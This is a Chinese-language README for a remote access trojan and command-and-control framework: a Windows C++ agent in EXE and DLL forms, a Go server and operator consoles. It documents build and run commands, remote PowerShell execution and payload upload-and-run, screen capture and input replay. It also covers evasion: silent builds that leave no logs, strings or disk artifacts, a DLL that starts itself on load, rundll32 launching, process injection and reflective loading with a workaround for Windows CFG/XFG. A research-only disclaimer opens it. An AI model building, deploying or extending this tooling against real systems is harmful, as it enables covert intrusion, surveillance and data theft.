# C2 远控系统（rat/c2）

> **⚠️ 免责声明**
>
> 本项目**仅供安全研究、教学与已获明确授权的测试**使用。
> **严禁**将其用于任何未授权的入侵、控制、监听或数据窃取等非法用途。
> 使用者须自行确保行为合法合规，并**独立承担由此产生的一切后果与法律责任**；
> 作者不对任何使用、滥用或由此造成的损害负责，亦不提供任何形式的担保。

基于《ARCHITECTURE.md》架构设计计划书实现的可扩展 C2 远控系统。

- **客户端**：C++（Windows；同一套 core 源码出 **EXE 与 DLL 两种产物**，见下）
- **服务端**：Go（C2 中转/管理服务器）
- **控制端**：Go CLI（`ratctl`）+ C++ GUI（`im_ctl`）+ C++ 轻量查看器（`viewer`）
- **协议**：自定义二进制（20B 固定头 + 分模块指令码），AES-256-GCM 加密（PSK→HKDF 派生）
- **当前状态**：核心通信 + beacon/TCP 双信道 + 屏幕流/输入回放 + 截屏 + **payload 上传执行** +
  ratctl 命令补全 + viewer 查看器 + **RatAgent 的 DLL 形态（rundll32 / LoadLibrary / 注入）** +
  **反射加载实测**（外部 RfUdrl 出 PIC，`tools/runpic` 执行）
  （详见 `docs/DESIGN.md`、`docs/PROGRESS.md`）

## 目录结构

```
c2/
├── docs/protocol.md           # 协议规范 v1（两端唯一契约；§10 为 payload 上传）
├── internal/protocol/         # Go 共享协议层（头编解码 + AES-GCM/HKDF + 向量单测）
│   └── testdata/vectors.json  # 测试向量（Go/C++ 交叉验证）
├── cmd/genvectors/            # 测试向量生成器（go run ./cmd/genvectors）
├── server/                    # Go C2 服务器
│   ├── cmd/c2server/          # 4444 会话/转发、8080 beacon、4445 屏幕流中继
│   └── internal/session/      # 会话注册表（离线/回收）
├── ctl/                       # Go CLI
│   └── cmd/ratctl/            # 交互式 shell（会话/系统/截屏/远控/payload）
├── client/                    # C++ Agent（多模块解决方案：sys / screen / template）
│   ├── agents.sln             # VS 打开这个：模块分组，core(共享)/docs 有独立文件夹
│   ├── RatAgent.sys.exe.vcxproj  # sys 模块 EXE 形态 → RatAgent.sys.exe（控制台）
│   ├── RatAgent.sys.vcxproj      # sys 模块 DLL 形态 → RatAgent.sys.dll（rundll32/宿主/注入；静态 CRT）
│   ├── caps_sys.cpp           # "sys"模块的能力清单（每个模块工程一份）
│   ├── agents/_template/      # **模块工程模板**：复制它开新模块（见其 README）
│   ├── agents/screen/         # "screen"（远程桌面）模块：抓屏/屏幕流/输入回放/桌面切换
│   └── core/                  # protocol/crypto/net/session/cmd_dispatch/capability
│                              # + agent_runtime(共用运行核心) / agent_dll(导出) / main(EXE 入口)
│                              # + module_id(模块命名空间) / agent_debug(诊断开关)
├── viewer/                    # C++ Win32 远控查看器（独立 CMake 工程）
├── im_ctl/                    # C++ ImGui 控制端
├── tools/runpic/              # PIC blob 执行器（反射加载验证 harness，配合外部 loader）
└── scripts/                   # e2e_m1~m4 + e2e_rdll/e2e_quiet/e2e_modules/e2e_screen/e2e_template
                               # + check_projects.py（工程结构自检：引用存在性/分组/漏项）
```

> **解决方案结构**（在 VS 里看到的树）：`core (shared)` 放共享内核的入口文件（它没有独立工程，
> 被编进每个模块）、`docs` 放文档、然后每个模块一个文件夹（`sys` / `screen` / `template`），
> 每个文件夹里是同一模块的 **EXE 形态** + **DLL 形态**两个工程。
>
> 打开某个模块工程后，文件也是按**来源**分两组（不是平铺）：`core (shared)` = 被所有模块编译的
> 共享内核、`module (<模块名>)` = 本模块自有文件。改名/搬文件之后可以跑
> `python scripts/check_projects.py` 自检（引用是否存在、文件是否都分组、有没有漏进工程的游离文件）。

## 构建

**Go**（go 1.25+）：

```
go build -o bin/c2server.exe ./server/cmd/c2server
go build -o bin/ratctl.exe    ./ctl/cmd/ratctl
go test ./...                 # 协议单测（含测试向量验证）
```

**C++ Agent**（VS2022/18，v145 工具集）：用 VS 打开 `client/agents.sln`
（sys / screen / template 三个模块，每个模块 EXE + DLL 两个工程），或命令行生成：

```
MSBUILD = "C:/Program Files/Microsoft Visual Studio/18/Community/MSBuild/Current/Bin/amd64/MSBuild.exe"
# 整个解决方案（6 个工程：sys/screen/template 各 EXE+DLL），产物统一落 client/x64/<Config>/
"%MSBUILD%" client/agents.sln -p:Configuration=Release -p:Platform=x64

# 或单独编某个工程
"%MSBUILD%" client/RatAgent.sys.exe.vcxproj -p:Configuration=Debug -p:Platform=x64   # → RatAgent.sys.exe
"%MSBUILD%" client/RatAgent.sys.vcxproj     -p:Configuration=Debug -p:Platform=x64   # → RatAgent.sys.dll
```

> 通过解决方案构建时，6 个产物都落在 `client/x64/<Config>/`，**符号文件与产物同名**
> （`RatAgent.sys.dll` 配 `RatAgent.sys.dll.pdb`、`RatAgent.screen.exe` 配 `RatAgent.screen.exe.pdb`），
> 不会互相覆盖。每个工程有**自己的中间目录**（`<工程名>/x64/<Config>/`）：EXE 与 DLL 工程编译
> 同一批 core 源码但宏不同（`_CONSOLE` vs `_USRDLL`），共用中间目录会导致 `.obj` 互相覆盖、
> 静默产出错误二进制。

> Debug / Release **都是静态 CRT `/MT`**（`dumpbin /dependents` 只有系统 DLL），Release 体积更小
> （约 375 KB vs 1.9 MB），反射加载验证用的是 Release。指定 `-p:OutDir=` 时 Debug/Release 建议分目录。

### 静默构建（无诊断输出、无落盘文件）

诊断输出与落盘由 `client/core/agent_debug.h` 的两个**编译期开关**控制，可用 MSBuild 属性覆盖：

| 属性 | 默认 | 作用 |
|---|---|---|
| `RatAgentDebug` | `1` | `0` = 诊断宏 `AGENT_LOG(...)` 编译为空操作：**格式串不会进二进制**、不落日志、不碰 stdout |
| `RatAgentPersistId` | 跟随 `RatAgentDebug` | `0` = `agent.id` 不落盘：身份只在内存（重启后变化），磁盘零写入 |

```
:: 静默版：无任何输出、磁盘零写入
"%MSBUILD%" client/RatAgent.sys.vcxproj -p:Configuration=Release -p:Platform=x64 -p:RatAgentDebug=0 ...
:: 静默但保留稳定身份（只落 agent.id，不打印、不落日志）
"%MSBUILD%" client/RatAgent.sys.vcxproj -p:Configuration=Release -p:Platform=x64 -p:RatAgentDebug=0 -p:RatAgentPersistId=1 ...
```

实测（Release）：DLL 从 374,784 B 降到 351,232 B，6 条典型诊断串由 6/6 命中变为 **0/6**；
静默版仍能上线并应答指令，且**不创建目录、不写 agent.log/agent.id**（`python scripts/e2e_quiet.py`）。

> 代价：静默版重启后 `agent_id` 变化 ⇒ "重连同 ID" 与 "另一进程凭 `agent.id` 停止" 不再成立
> （仍可按已知的 32 位 hex 触发命名事件）。跨进程停止用的命名事件 `Local\RatAgentStop.<id>`
> 仍会创建 —— 它是内核对象，不是磁盘 IOC。

产物：`client/x64/<Config>/RatAgent.sys.exe` 与 `client/x64/<Config>/RatAgent.sys.dll`
（`RatAgent.sys.*` = **sys 模块**的产物；每个模块的产物名都是 `RatAgent.<module>.<形态>`）。

> 受限环境（无 GUI/沙箱会话）下，既有 VS 输出目录可能不可写，改用工作区内新目录：
> `-p:IntDir=<repo>/build/agent/obj/ -p:OutDir=<repo>/build/agent/bin/`，
> 并给 Go 设置 `GOCACHE=<repo>/.gocache`、输出到 `build/bin/`。

### Agent 两种形态与适用场景

| 形态 | 入口 | 适用场景 | 身份/日志位置 |
|---|---|---|---|
| `RatAgent.<module>.exe` | `main()`（控制台） | 独立进程部署、调试、`--selftest` | CWD 下 `<module>.id`；stdout |
| `RatAgent.<module>.dll` | 导出 `Start`/`StartAgent` 等 | rundll32 宿主、被其他程序/注入器加载 | `%LOCALAPPDATA%\RatAgent\<module>.id` + `<module>.log`（可用 `id=`/`log=` 覆盖） |

（例：sys 模块是 `RatAgent.sys.exe` / `RatAgent.sys.dll`，screen 模块是 `RatAgent.screen.exe` / `RatAgent.screen.dll`。）

DLL 的三种用法（都支持 `-tcp` 切长连接；默认 beacon `127.0.0.1:8080`、轮询 5s）：

```
:: 1) rundll32（Start 阻塞驻留，保证进程存活；Stop 可在另一个进程里触发跨进程停止事件）
rundll32 RatAgent.sys.dll,Start 127.0.0.1,8080,-s,5
rundll32 RatAgent.sys.dll,Stop  id=<module>.id 路径或 32 位 hex>

:: 2) 自己的加载器 / 宿主（同进程启停，可 FreeLibrary 卸载）
LoadLibraryW(L"RatAgent.sys.dll") → StartAgent("127.0.0.1,8080,-s,5") → … → StopAgent()

:: 3) 注入 / 反射加载（远程 LoadLibrary，或手动映射；这类场景没有参数通道）
::    本 DLL **加载即自启**：有 %LOCALAPPDATA%\RatAgent\<module>.autostart.args（或 %TEMP% 下
::    同名文件）就用文件里的参数串；**没有该文件则用内置默认配置**（beacon 127.0.0.1:8080、
::    轮询 5s；<module>.id / 日志落 %LOCALAPPDATA%\RatAgent\）。
```

### 模块清单与拆分现状

同一份 `client/core` 可以编成多个**模块 agent**（每个模块是一个独立进程、**直连 C2**）。
模块之间不需要插件 ABI/加载器：新增能力 = 复制 [client/agents/_template](client/agents/_template/)
+ 在自己的 `caps.cpp` 里登记指令。

| 模块 | 产物 | 能力（能力位） | 说明 |
|---|---|---|---|
| `sys` | `RatAgent.sys.exe` / `RatAgent.sys.dll` | `bit0` 系统类 | sysinfo / exec / payload（由 core 内置处理） |
| `screen` | `RatAgent.screen.exe` / `RatAgent.screen.dll` | `bit1` 远程桌面 | 抓屏 `0x1001` / 屏幕流 `0x1002` / 输入回放（数据走 4445 中继）；源码在 [client/agents/screen](client/agents/screen/) |
| `template` | `RatAgent.template.exe` / `.dll` | `bit0` | 工程模板（自带 `0x2001` 示例指令），复制它开新模块 |

> **拆分带来的行为变化**：`screenshot`（0x1001）与屏幕流（0x1002）现在由 **`screen` 模块**提供，
> `sys` 模块收到这两个指令会返回未知指令（`status=0x01`）。操作时先 `sessions` 看标签
> （`Windows (screen)`），再用 **`use screen`**（支持按模块标签解析）切到它。
> viewer 的拉流配对逻辑不变（帧仍发给"发起 `0x1002` 的那条 ctl 连接"）。

### 模块命名空间（同机多模块共存）

多个模块在同一台机器上共存时各有自己的落盘物与 C2 侧标识——这是共存的**前提**，因为服务器按
`agent_id` 索引，`Registry.Register` 遇到 id 冲突会**踢掉旧会话**（两个模块共用一份 id 就会互相踢下线）：

| 项 | 规则 |
|---|---|
| 模块名 | 编译期常量，见 [client/core/module_id.h](client/core/module_id.h)（`RAT_MODULE_ID`，默认 `sys`） |
| 身份 / 日志 / 自启参数 | `%LOCALAPPDATA%\RatAgent\<module>.id` / `<module>.log` / `<module>.autostart.args` |
| 停止事件 | `Local\RatAgentStop.<agent_id_hex>`（**刻意不带模块前缀**：各模块 id 随机不撞名，这样任一模块的 DLL 都能停任意模块的实例） |
| C2 侧标签 | 握手 `os_info` = `Windows (<module>)`（TCP 信道）；能力位走 `plugins` 位图 |
| 能力位 | `bit0` 系统类（sysinfo/exec/payload）、`bit1` 远程桌面（抓屏/流/输入回放） |

```
:: 同一工程出不同模块（默认 sys；新模块工程应把这两个值写死成自己的）
"%MSBUILD%" client/RatAgent.sys.exe.vcxproj -p:Configuration=Release -p:Platform=x64 ^
    -p:RatAgentModuleId=probe "-p:RatAgentModuleCaps=(c2::kCapSys)" ...

:: 屏幕模块（它有自己的工程）
"%MSBUILD%" client/agents/screen/RatAgent.screen.exe.vcxproj -p:Configuration=Release -p:Platform=x64 ...
```

> ⚠ 已知缺口：**beacon 信道的会话在服务端是硬编码 `OSInfo="beacon-agent"` 的**，握手元数据
> （os/plugins）只走 TCP 长连接的 HELLO。所以模块标签目前只在 `-tcp` 模式下可见；
> beacon 侧要带标签需要一次小的协议补充（计划中，尚未实现）。

> ⚠ **加载即自启的副作用**：自启在 DllMain 之后的新线程上**延迟 300ms** 执行，而显式入口
> （rundll32 的 `Start`/`Stop`、宿主的 `StartAgent`）是加载完成后立即调用的，两者存在竞争。
> 实测（本机）：`Start <args>` 显式参数仍生效、进程驻留；`Stop <id>` 跨进程停止正常，且
> `Stop` 不阻塞、进程在 300ms 前就退出，**不会**留下自启实例。但**不调用任何导出的常驻
> `LoadLibrary` 宿主会在自己进程里自动起一份默认 agent**；若显式调用晚于这 300ms，也会被
> 默认自启抢先（参数被忽略 / `Stop` 退化为同进程停止）。要规避就写 `autostart.args` 给定
> 参数，或避免常驻宿主。

> **为什么注入要这样**：现代 Windows 目标的 CFG/XFG 会拦住"把远程线程入口指向镜像内任意导出"
> （表现为 `0xC0000409`/`__fastfail`），但远程 `LoadLibraryW`（kernel32 地址）仍然可用。
> 因此推荐"远程加载 + 触发器自启动"，而不是远程直接调用导出函数。
>
> **手动映射（reflective load）契约**：本 DLL 用静态 CRT（`/MT`，无 VC 运行库 DLL 依赖），
> **必须先调用入口点**（`DllMainCRTStartup`，参数 `DLL_PROCESS_ATTACH`）让 CRT 完成初始化，
> 之后才能调用导出；不依赖 `GetModuleFileName`/CWD/TLS，故映射后仍可用（`id=`/`log=` 可指定路径）。

**viewer**（C++ Win32，独立 CMake 工程）：

```
cmake -S viewer -B viewer/build
cmake --build viewer/build --config Debug      # 产物 viewer/build/bin/viewer.exe
```

**im_ctl**（C++ ImGui 控制端，可选）：

```
cmake -S im_ctl -B im_ctl/build
cmake --build im_ctl/build --config Debug
```

> 本仓库**不托管** `im_ctl/external/`（imgui / glad / glfw 第三方源码，且 imgui 自带独立
> `.git`，见 `.gitignore`）。要构建 im_ctl，请先自行获取：
> `imgui`（含 `backends/`）、`glad`（含 `src/glad.c`）、`glfw`（含 `lib-vc2026/glfw3.lib`）
> 放到 `im_ctl/external/` 下，或改用 git submodule。viewer 不依赖这些，可直接构建。

**runpic**（PIC blob 执行器，反射加载验证用）：

```
cmake -S tools/runpic -B build/runpic
cmake --build build/runpic --config Release    # 产物 build/runpic/bin/runpic.exe
```

> 用法：`runpic.exe <pic.bin> [--hold <秒>]`。它只负责把 PIC 跑起来（RWX 映射 +
> `CreateThread` 进偏移 0 的 `go()`），加载逻辑在 PIC 内部（如外部 RfUdrl loader）；
> 详见 `docs/PROGRESS.md` §8.5 与 `scripts/e2e_rdll.py`。

## 运行与联调

1. 启动 C2：`./bin/c2server.exe`（监听 4444 + 4445 + 8080，PSK 编译期内置）
2. 启动 Agent（三选一）：
   - beacon（默认）：`RatAgent.sys.exe 127.0.0.1 8080 -s 5`
   - TCP 长连接：`RatAgent.sys.exe 127.0.0.1 4444 -tcp`
   - DLL 形态：`rundll32 RatAgent.sys.dll,Start 127.0.0.1,8080,-s,5`（详见上文"Agent 两种形态"）
   - `--selftest` 可单独跑加密自检后退出
3. 控制端：`./bin/ratctl.exe`，交互式命令：

```
sessions                          列出在线 Agent
use <agent_id> / back             切换目标 Agent（支持前缀匹配）
session <agent_id> / kill <id>    会话详情 / 踢下线
sysinfo / exec <powershell>       系统信息 / 执行命令
screenshot [id] <file>            远程截屏存盘（JPEG）
screen [id] [fps] [quality] [scale]   拉起 viewer 查看/操作远程屏幕
stop                              停止当前 Agent 的屏幕流
payload <file> [name] [--args <参数>] 上传二进制 payload 并执行
```

4. 自动验收：`python scripts/e2e_m3.py`（beacon + ratctl）、`python scripts/e2e_m4.py`（屏幕流）、
   `python scripts/e2e_rdll.py`（反射加载：需先有 `build/e2e/out.bin`，见 `docs/PROGRESS.md` §8.5）、
   `python scripts/e2e_quiet.py`（静默构建）、`python scripts/e2e_modules.py`（模块命名空间共存）、
   `python scripts/e2e_template.py`（模块模板）、`python scripts/e2e_screen.py`（远程桌面模块，阶段 2）、
   `python scripts/check_projects.py`（工程结构自检：引用是否存在、文件是否分组、有无漏项）

## 协议要点

- 数据包：`magic(0x5A5A) + version + flags + seq + timestamp + cmd + plugin + status + payload_len + payload`
- 加密：payload 用 AES-256-GCM（12B 随机 nonce），头部明文；密钥 = `HKDF-SHA256(PSK, client_nonce||server_nonce, "rat-v1")`
- 指令码分段：`0x0` 核心 / `0x1` 远程控制 / `0x2` 文件 / `0x3` 系统 / `0x4` 管理（详见 `docs/protocol.md`）
- 已实现业务指令：`0x1001` 截屏、`0x1002` 屏幕流、`0x3001` 系统信息、`0x3008` PowerShell、`0x3009` payload

## 路线图

- **M1 ✅** 协议 + 核心通信（握手/心跳/会话/离线判定）
- **M2 ✅** beacon 信道 + 命令分发（SYS_INFO/EXEC_PS）
- **M3 ✅** 屏幕流 + 输入回放（4445）+ 截屏 + payload 上传执行 + ratctl 补全 + viewer
- **M3.5 ✅** Agent 双产物（EXE/DLL）+ 可停止/可卸载 + 注入自启动触发器
- **M4** 插件框架（`plugin_api.h` + 加载器）、文件管理、进程/服务/注册表、多 CLI、打包与文档
